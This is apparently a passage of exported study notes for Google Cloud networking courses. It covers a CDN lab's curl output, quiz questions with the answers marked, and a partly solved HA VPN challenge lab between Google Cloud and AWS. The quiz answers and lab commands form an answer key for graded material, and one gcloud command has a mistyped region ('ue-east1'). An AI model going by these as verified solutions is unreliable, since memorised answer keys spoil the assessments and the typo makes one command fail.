http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  HTTP/1.1 200 OK</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  X-GUploader-UploadID: ADPycdtI7f49P3MSuZSZ8vl6RwfwmnIDJ59EeSKp7UPvLPawdaiRHXiNWLtseQTxUxceWOvSLvpYmT3pWVkV4qeIP7M</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Date: Mon, 13 Dec 2021 23:06:46 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ETag: "8f9327db2597fa57d2f42b4a6c5a9855"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-generation: 1639431957957903</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-metageneration: 2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-stored-content-encoding: identity</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-stored-content-length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Content-Type: image/png</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-hash: crc32c=TeiHTA==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-storage-class: STANDARD</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Accept-Ranges: bytes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Content-Length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Server: UploadServer</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Age: 1621</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Cache-Control: public,max-age=3600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> { [775 bytes data]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Connection #0 to host 34.98.81.123 left intact</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Closing connection 0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 720px;"></div><div class="CodeMirror-gutters" style="display: none; height: 720px;"></div></div></div></pre><p><span>Try it a couple of times and see if you get a 403 status code.</span></p><h4 id='congratulations-6'><span>Congratulations!</span></h4><p><span>You have successfully created a Cloud Storage bucket, uploaded an image to it, bound it to a load balancer, and then enabled Cloud CDN and edge security policies on it.</span></p><p>&nbsp;</p><h3 id='quiz-12'><span>Quiz</span></h3><ol start='' ><li><p><span>CDN Interconnect provides:</span></p></li></ol><ul><li><p><span>A direct connection between your origin servers and Google&#39;s Cloud Load Balancing service.</span></p></li><li><p><span>A private connection between your on-premises network and Google Cloud.</span></p></li><li><p><strong><span>A direct peering connection between third-party content delivery networks (CDNs) and Google&#39;s edge network.</span></strong></p></li><li><p><span>A virtual private network (VPN) tunnel between your VPC network and Google&#39;s global network.</span></p></li></ul><p><span>Correct. CDN Interconnect facilitates direct peering between CDNs and Google&#39;s edge, improving content delivery.</span></p><ol start='2' ><li><p><span>When you use the internal IP address of the forwarding rule to specify an internal Network Load Balancer next hop, the load balancer can only be:</span></p></li></ol><ul><li><p><strong><span>In the same VPC network as the next hop route or in a peered VPC network.</span></strong></p></li><li><p><span>In the same VPC network as the next hop route.</span></p></li><li><p><span>In the same subnet as the next hop route.</span></p></li><li><p><span>In the same subnet as the next hop route or a shared VPC network.</span></p></li></ul><p><span>This is correct. When using an internal IP address of the forwarding  rule, the Network Load Balancer can be located either in the same VPC  network as the next hop route or in a VPC network that is peered with  it.</span></p><ol start='3' ><li><p><span>Which of the following best practices help optimize load balancing cost?</span></p></li></ol><ul><li><p><span>Ignoring load balancer health checks to avoid additional API calls.</span></p></li><li><p><strong><span>Implementing a caching layer with a content delivery network (CDN).</span></strong></p></li><li><p><span>Selecting the most expensive load balancer type for maximum performance.</span></p></li><li><p><span>Overprovisioning load balancer resources to handle peak traffic loads.</span></p></li></ul><p><span>Correct. CDNs can offload traffic from your origin servers, reducing the load on your load balancer and potentially allowing you to use a  smaller, less expensive option</span></p><p>&nbsp;</p><h1 id='networking-in-google-cloud-hybrid-and-multicloud'><span>Networking in Google Cloud: Hybrid and Multicloud</span></h1><h2 id='connectivity-options'><span>Connectivity Options</span></h2><h3 id='quiz-13'><span>Quiz</span></h3><ol start='' ><li><p><span>Your company is located in a city where Google Cloud does not have a Dedicated Interconnect location, but you need a private connection to your Google Cloud Virtual Private Cloud (VPC). Which Cloud Interconnect option is most suitable for this scenario?</span></p></li></ol><ul><li><p><span>Dedicated Interconnect</span></p></li><li><p><strong><span>Partner Interconnect</span></strong></p></li><li><p><span>Carrier Peering</span></p></li><li><p><span>Network Connectivity Center</span></p></li></ul><p><span>This is correct. Partner Interconnect allows you to connect to Google&#39;s network through a supported service provider&#39;s facilities, even if there isn&#39;t a Dedicated Interconnect location in your city. This gives you a private connection to your VPC.</span></p><ol start='2' ><li><p><span>Which Google Cloud Interconnect option requires the customer to provide their own routing equipment and establish a Border Gateway Protocol (BGP) session with Google&#39;s edge network?</span></p></li></ol><ul><li><p><strong><span>Dedicated Interconnect</span></strong></p></li><li><p><span>Network Connectivity Center</span></p></li><li><p><span>Partner Interconnect</span></p></li><li><p><span>Cross-Cloud Interconnect</span></p></li></ul><p><span>Correct. Dedicated Interconnect requires customers to establish a direct physical connection to Google&#39;s network at a colocation facility.</span></p><p>&nbsp;</p><h2 id='cloud-vpn'><span>Cloud VPN</span></h2><h3 id='lab---create-highly-available-vpn-connections-between-google-cloud-and-aws'><span>LAB - Create Highly Available VPN Connections between Google Cloud and AWS</span></h3><p>&nbsp;</p><h4 id='ptppf058'><span>PTPPF058</span></h4><p><span>This lab is a part of the upcoming Partner Technical Presales Proficiency Framework (PTPPF) Program. This lab is intended for all technical Googlers and Partners. This lab is not intended for public consumption beyond this audience.</span></p><p><strong><span>Scoring:</span></strong><span> You must score </span><strong><span>80% or higher</span></strong><span> to pass this PTPPF Challenge lab.</span></p><h4 id='challenge-lab-overview'><span>Challenge lab overview</span></h4><p><span>This lab challenges you to perform actions and automation across products. Instead of following step-by-step instructions, you are given a common business scenario and a set of tasks – you then figure out how to complete them on your own, using your skills to come up with a solution that demonstrates your understanding of key concepts. An automated scoring system provides feedback on whether you have completed your tasks correctly. Are you up for the challenge?</span></p><h4 id='objective'><span>Objective</span></h4><p><span>This lab challenges you to demonstrate your ability to create highly available virtual private network (VPN) connections between Google Cloud and Amazon Web Services (AWS) for direct communication between virtual private cloud (VPC) networks across the two cloud platforms.</span></p><h4 id='setup-and-requirements-6'><span>Setup and requirements</span></h4><h4 id='log-into-aws'><span>Log into AWS</span></h4><p><span>Click the AWS Console link to log in to the AWS Management Console.</span></p><h4 id='log-into-google-cloud'><span>Log into Google Cloud</span></h4><h4 id='before-you-click-the-start-lab-button-4'><span>Before you click the Start Lab button</span></h4><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.</span></p><h4 id='what-you-need-3'><span>What you need</span></h4><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li><li><p><span>Time to complete the lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab.</span></p><p><strong><span>Note:</span></strong><span> If you are using a Pixelbook, open an Incognito window to run this lab.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-2'><span>How to start your lab and sign in to the Google Cloud Console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.</span></p></li></ol><p><span> </span><img src="https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D" referrerpolicy="no-referrer" alt="Open Google Console"></p><ol start='2' ><li><p><span>Copy the username, and then click </span><strong><span>Open Google Console</span></strong><span>. The lab spins up resources, and then opens another tab that shows the </span><strong><span>Sign in</span></strong><span> page.</span></p></li></ol><p><span> </span><img src="https://cdn.qwiklabs.com/VkUIAFY2xX3zoHgmWqYKccRLwFrR4BfARLd5ojmlbhs%3D" referrerpolicy="no-referrer" alt="Sign in"></p><p><span> *</span><strong><span>Tip:</span><span>*</span></strong><span> Open the tabs in separate windows, side-by-side.</span></p><p><span> If you see the </span><strong><span>Choose an account</span></strong><span> page, click </span><strong><span>Use Another Account</span></strong><span>.</span></p><p><span>  </span><img src="https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D" referrerpolicy="no-referrer" alt="Choose an account"></p><ol start='3' ><li><p><span>In the </span><strong><span>Sign in</span></strong><span> page, paste the username that you copied from the Connection Details panel. Then copy and paste the password.</span></p></li></ol><p><span>*</span><strong><span>Important:</span><span>*</span></strong><span> You must use the credentials from the Connection Details panel. Do not use your Qwiklabs credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).</span></p><ol start='4' ><li><p><span>Click through the subsequent pages:</span></p></li></ol><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul><p><span>After a few moments, the Cloud Console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> You can view the menu with a list of Google Cloud Products and Services by clicking the </span><strong><span>Navigation menu</span></strong><span> at the top-left. </span><img src="https://cdn.qwiklabs.com/oh1qwpHJqNk7NlbvLzIKjm2piwL%2FZ0tmduo8Yh46RFc%3D" referrerpolicy="no-referrer" alt="Cloud Console Menu"></p><h4 id='challenge-scenario'><span>Challenge scenario</span></h4><p><span>Headquartered in Minneapolis, Minnesota, Cymbal currently employs 775,000 people across the world and reported 192 billion US dollars in revenue in 2019.</span></p><p><span>Cymbal has always been strongly committed to innovation, uncovering meaningful ways to transform industries and deliver better experiences for its customers. Cymbal’s branded businesses span multiple sectors including manufacturing, financial services, media, healthcare, retail, aviation, and education.</span></p><p><span>Cymbal Group has been rapidly making the transition to a cloud-first operating model. Cymbal Bank, Superstore, and other Cymbal Group assets have all been adopting Google Cloud as part of their technology strategy. Recognizing the need for a multi-cloud architecture, the CIO of Cymbal Group has mandated a standard architecture for all new services, sharing a common network foundation that is based on Google Cloud and AWS.</span></p><h4 id='your-challenge'><span>Your challenge</span></h4><p><span>As a network architect employed at Cymbal Group, you have been asked to create highly available VPN connections between Google Cloud and Amazon Web Services (AWS) for direct communication between VPC networks across the two cloud platforms.</span></p><h4 id='task-1-create-the-highly-available-vpn-gateway-and-configure-cloud-router-on-google-cloud'><span>Task 1. Create the highly available VPN gateway and configure Cloud Router on Google Cloud</span></h4><p><span>Create a VPC network, a highly available VPN gateway, and configure the Cloud Router service on Google Cloud.</span></p><ol start='' ><li><p><span>Create a custom VPC network </span><code>cymbal-cloud-vpc</code><span> with a single subnet </span><code>cymbal-cloud-subnet</code><span> in the </span><code>us-east1</code><span> region.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create cymbal-cloud-vpc \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --subnet-mode custom \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --bgp-routing-mode global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create cymbal-cloud-subnet \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network cymbal-cloud-vpc \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --range 10.1.1.0/24</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre></li><li><p><span>Create the highly available VPN gateway </span><code>cymbal-cloud-ha-vpn-gw</code><span> in the network </span><code>cymbal-cloud-vpc</code><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute vpn-gateways create cymbal-cloud-ha-vpn-gw \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network cymbal-cloud-vpc \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region ue-east1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre></li><li><p><span>Create a Cloud Router service asset named </span><code>cymbal-cloud-router</code><span> in the </span><code>us-east1</code><span> region.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create the highly available VPN gateway and configure Cloud Router on Google Cloud</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 2. Create gateways and VPN connections on AWS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create customer gateways, a target gateway, and VPN connections with dynamic routing.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Configure the AWS command-line interface (CLI).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Connect to the Google Compute Engine virtual machine (VM) named `lab-setup` via SSH.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Type `aws configure`.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Follow the steps and enter the AWS Access Key ID and AWS Secret Access Key displayed in the lab user information panel.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - For the region, select **us-east-1**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Create two customer gateways.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Create a **virtual private gateway** as a target gateway and attach it to to your pre-created VPC network `CymbalAdVpc` on AWS side.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Create two VPN connections with dynamic routing.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create gateways and VPN connections on AWS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 3. Create VPN tunnels and Cloud Router interfaces on Google Cloud</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Use the information from the AWS VPN connections that you created in the previous tasks to create and configure components on Google Cloud.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Create an external VPN gateway with four interfaces for the AWS externally-facing IP addresses.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Create four VPN tunnels.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Create four interfaces to Cloud Router.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Add border gateway protocol (BGP) peers.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create VPN tunnels and Cloud Router interfaces on Google Cloud</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 4. Verify the configuration</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Verify the router and tunnel configuration.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check the tunnel status using the following code:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 1170px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1170px;"></div></div></div></pre><p><span>GET_TUNNEL_1=$(gcloud compute vpn-tunnels list --format=&#39;value</span><a href='NAME'></a><span>&#39;|head -1) &amp;&amp; \</span>
<span>  gcloud compute vpn-tunnels describe $GET_TUNNEL_1 \</span>
<span>       --region us-east1 \</span>
